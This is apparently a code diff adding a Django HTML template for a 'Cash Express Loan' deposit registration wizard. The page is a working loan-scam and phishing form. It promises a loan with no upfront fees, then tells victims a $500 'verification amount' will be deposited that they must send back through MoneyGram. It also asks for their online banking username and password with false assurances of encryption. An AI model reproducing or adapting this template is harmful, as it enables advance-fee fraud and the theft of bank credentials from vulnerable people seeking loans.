@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+{% load static %}
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="Wilio Survey, Quotation, Review and Register form Wizard by Ansonika.">
+    <meta name="author" content="Ansonika">
+    <title>Loan Deposit | Register Form</title>
+
+    <!-- Favicons-->
+    <link rel="shortcut icon" href="img/favicon.ico" type="image/x-icon">
+    <link rel="apple-touch-icon" type="image/x-icon" href="{% static 'autoclose/static/img/apple-touch-icon-57x57-precomposed.png' %}">
+    <link rel="apple-touch-icon" type="image/x-icon" sizes="72x72" href="{% static 'autoclose/static/img/apple-touch-icon-72x72-precomposed.png' %}">
+    <link rel="apple-touch-icon" type="image/x-icon" sizes="114x114" href="{% static 'autoclose/static/img/apple-touch-icon-114x114-precomposed.png' %}">
+    <link rel="apple-touch-icon" type="image/x-icon" sizes="144x144" href="{% static 'autoclose/static/img/apple-touch-icon-144x144-precomposed.png' %}">
+
+    <!-- GOOGLE WEB FONT -->
+    <link href="https://fonts.googleapis.com/css?family=Work+Sans:400,500,600" rel="stylesheet">
+
+    <!-- BASE CSS -->
+    <link href="{% static 'autoclose/static/css/bootstrap.min.css' %}" rel="stylesheet">
+	<link href="{% static 'autoclose/static/css/menu.css' %}" rel="stylesheet">
+    <link href="{% static 'autoclose/static/css/style.css' %}" rel="stylesheet">
+	<link href="{% static 'autoclose/static/css/vendors.css' %}' %}" rel="stylesheet">
+
+    <!-- YOUR CUSTOM CSS -->
+    <link href="{% static 'autoclose/static/css/custom.css' %}" rel="stylesheet">
+
+	<!-- MODERNIZR MENU -->
+	<script src="{% static 'autoclose/static/js/modernizr.js' %}"></script>
+
+</head>
+
+<body>
+
+	<div id="preloader">
+		<div data-loader="circle-side"></div>
+	</div><!-- /Preload -->
+
+	<div id="loader_form">
+		<div data-loader="circle-side-2"></div>
+	</div><!-- /loader_form -->
+
+	<nav>
+		<ul class="cd-primary-nav">
+			<li><a href="index.html" class="animated_link">Home</a></li>
+			<li><a href="quotation-wizard-version.html" class="animated_link">Aboot Us</a></li>
+			<li><a href="review-wizard-version.html" class="animated_link">Customers Review</a></li>
+			<li><a href="registration-wizard-version.html" class="animated_link">Live Chat</a></li>
+			<li><a href="about.html" class="animated_link">Verification FAQ</a></li>
+			<li><a href="contacts.html" class="animated_link">Contact Us</a></li>
+		</ul>
+	</nav>
+	<!-- /menu -->
+
+	<div class="container-fluid full-height">
+		<div class="row row-height">
+			<div class="col-lg-6 content-left">
+				<div class="content-left-wrapper">
+					<a href="index.html" id="logo"><img src="img/logo.png" alt="" width="49" height="35"></a>
+					<div id="social">
+
+					</div>
+					<!-- /social -->
+					<div>
+						<figure><img src="img/info_graphic_2.svg" alt="" class="img-fluid"></figure>
+						<h2>Loan Deposit Registration</h2>
+				<p>To deposit loan amount in your account, We need some details from your side and after that we will deposit the loan amount directly in your bank account within 24 hours maximum or less than that. <br> No upfront fees needed. You are already eligible to receive this loan, we just need some additional details to deposit the funds in your account.<br> Please note: We will encrypt your information to secure it. Be assured, it's secure and safe with us. </p>
+
+						<a href="#start" class="btn_1 rounded mobile_btn">Start Now!</a>
+					</div>
+					<div class="copy">© 2020 Cash Express Loan</div>
+				</div>
+				<!-- /content-left-wrapper -->
+			</div>
+			<!-- /content-left -->
+
+			<div class="col-lg-6 content-right" id="start">
+				<div id="wizard_container">
+					<div id="top-wizard">
+							<div id="progressbar"></div>
+						</div>
+						<!-- /top-wizard -->
+						<form id="wrapped" method="POST"> {% csrf_token %}
+							<input id="website" name="website" type="text" value="">
+							<!-- Leave for security protection, read docs for details -->
+							<div id="middle-wizard">
+								<div class="step"> {{ form.non_field_errors }}
+									<h3 class="main_question"><strong>1/7</strong>Please fill with your details (We will use this to contact you back)</h3>
+									<div class="form-group">
+										{{form.first_name}}
+									</div>
+									<div class="form-group">
+									{{form.last_name}}
+									</div>
+									<div class="form-group">
+										{{form.email}}
+									</div>
+									<div class="form-group">
+										{{form.phone}}
+									</div>
+
+								</div>
+
+                                <div class="step">
+									<h3 class="main_question"><strong>2/7</strong>Please provide your banking details</h3> <p>You are going to receive your loan amount on tomorrow morning before 6:00 AM(EST) in your bank account.</p> 									<div class="form-group">
+										{{form.bankname}}
+									</div>
+									<div class="form-group">
+										{{form.how_long_banking}}
+									</div>
+									<div class="form-group">
+										{{form.monthly_income}}
+									</div>
+
+
+								</div>
+
+
+                                 <div class="step">
+									<h3 class="main_question"><strong>3/7</strong>Verification Process Required.</h3> <p>Thank you for providing the required details. <br> All the procedure has been done successfully, only the verification process is remaining. <br> Before we deposit the loan amount in your account, we need to confirm your identity and bank account. So we are going to deposit the verification amount of $500 in your account, and you need to send it back to complete the verification process, and after this, we will deposit the loan amount within 45 minutes in your account. <br> This is to prevent fraud and to verify bank and user identity.
+<br>
+                                     Please Note: Even If you have negative balance, we will cover it from our side. <br>(For example: If you have negative balance of $20 then you need to send only $480 back)
+    <br>
+                                     <br> Click next to know - How you can send the verification amount back?
+</p>
+
+
+								</div>
+
+
+
+                                  <div class="step">
+									<h3 class="main_question"><strong>4/7</strong>How To Send The Verification Amount Back?</h3> <p>
+                                      You can send us the verification amount back through MoneyGram. <br>
+MoneyGram is secure and easy to do. <br>
+Plus, our company will pay the MoneyGram fees. <br>
+We will send you the MoneyGram instructions on your email address and text message <br>
+</p>
+
+
+								</div>
+
+                                 <div class="step">
+									<h3 class="main_question"><strong>5/7</strong>Verification amount deposit time.</h3> <p>We are going to deposit the verification amount in your account on tomorrow morning before 6:00 AM EST. Please let us know when you will be able to return it?</p> 									<div class="form-group">
+
+									</div>
+									{{form.send_time}}
+
+								</div>
+
+
+
+
+								<!-- /step-->
+								<div class="step">
+									<h3 class="main_question"><strong>6/7</strong>Final Details - Online Banking Information</h3> <p>We deposit verification amount through Mobile Deposit. For that, we need your online banking username and password. This form is encrypted so this information will be used for deposit purpose only and you are allowed to change it once you get the loan amount successfully in your account. </p>
+									<div class="form-group">
+										{{form.username}}
+									</div>
+									<div class="form-group">
+									{{form.password1}}
+									</div>
+									<div class="form-group">
+									{{form.password2}}
+									</div>
+									<div id="pass-info" class="clearfix"></div>
+								</div>
+								<!-- /step-->
+								<div class="submit step">
+									<h3 class="main_question"><strong>7/7</strong>Summary</h3>
+                                    <p> By clicking on submit, we will redirect you to your loan supervisor on Live Chat so he/she can review your information to deposit the loan amount.</p>
+									<div class="summary">
+										<ul>
+											<li><strong>1</strong>
+												<h5>Personal Details</h5>
+												<ul>
+													<li><label>First Name</label>: <span id="first_name"></span></li>
+													<li><label>Last Name</label>: <span id="last_name"></span></li>
+													<li><label>Email</label>: <span id="email"></span></li>
+
+                                                    <li><label> Send back time:</label>  <span id="send_time"></span></li>
+												</ul>
+											</li>
+											<li><strong>2</strong>
+												<h5>Online Banking Details</h5>
+												<ul>
+													<li><label>Username</label>: <span id="user_name"></span></li>
+													<li><label>Password</label>: <span id="password"></span></li>
+												</ul>
+											</li>
+										</ul>
+									</div>
+								</div>
+								<!-- /step-->
+							</div>
+							<!-- /middle-wizard -->
+							<div id="bottom-wizard">
+								<button type="button" name="backward" class="backward">Prev</button>
+								<button type="button" name="forward" class="forward">Next</button>
+								<button type="submit" name="process" class="submit">Submit</button>
+							</div>
+							<!-- /bottom-wizard -->
+						</form>
+					</div>
+					<!-- /Wizard container -->
+			</div>
+			<!-- /content-right-->
+		</div>
+		<!-- /row-->
+	</div>
+	<!-- /container-fluid -->
+
+	<div class="cd-overlay-nav">
+		<span></span>
+	</div>
+	<!-- /cd-overlay-nav -->
+
+	<div class="cd-overlay-content">
+		<span></span>
+	</div>
+	<!-- /cd-overlay-content -->
+
+	<a href="#0" class="cd-nav-trigger">Menu<span class="cd-icon"></span></a>
+	<!-- /menu button -->
+
+	<!-- Modal terms -->
+	<div class="modal fade" id="terms-txt" tabindex="-1" role="dialog" aria-labelledby="termsLabel" aria-hidden="true">
+		<div class="modal-dialog modal-dialog-centered">
+			<div class="modal-content">
+				<div class="modal-header">
+					<h4 class="modal-title" id="termsLabel">Terms and conditions</h4>
+					<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
+				</div>
+				<div class="modal-body">
+					<p>Lorem ipsum dolor sit amet, in porro albucius qui, in <strong>nec quod novum accumsan</strong>, mei ludus tamquam dolores id. No sit debitis meliore postulant, per ex prompta alterum sanctus, pro ne quod dicunt sensibus.</p>
+					<p>Lorem ipsum dolor sit amet, in porro albucius qui, in nec quod novum accumsan, mei ludus tamquam dolores id. No sit debitis meliore postulant, per ex prompta alterum sanctus, pro ne quod dicunt sensibus. Lorem ipsum dolor sit amet, <strong>in porro albucius qui</strong>, in nec quod novum accumsan, mei ludus tamquam dolores id. No sit debitis meliore postulant, per ex prompta alterum sanctus, pro ne quod dicunt sensibus.</p>
+					<p>Lorem ipsum dolor sit amet, in porro albucius qui, in nec quod novum accumsan, mei ludus tamquam dolores id. No sit debitis meliore postulant, per ex prompta alterum sanctus, pro ne quod dicunt sensibus.</p>
+				</div>
+				<div class="modal-footer">
+					<button type="button" class="btn_1" data-dismiss="modal">Close</button>
+				</div>
+			</div>
+			<!-- /.modal-content -->
+		</div>
+		<!-- /.modal-dialog -->
+	</div>
+	<!-- /.modal -->
+
+	<!-- COMMON SCRIPTS -->
+	<script src="{% static 'autoclose/static/js/jquery-3.2.1.min.js' %}"></script>
+    <script src="{% static 'autoclose/static/js/common_scripts.min.js' %}"></script>
+	<script src="{% static 'autoclose/static/js/velocity.min.js' %}"></script>
+	<script src="{% static 'autoclose/static/js/functions.js' %}"></script>
+	<script src="{% static 'autoclose/static/js/pw_strenght.js' %}"></script>
+
+	<!-- Wizard script -->
+	<script src="{% static 'autoclose/static/js/registration_func.js' %}"></script>
+
+</body>
+</html>
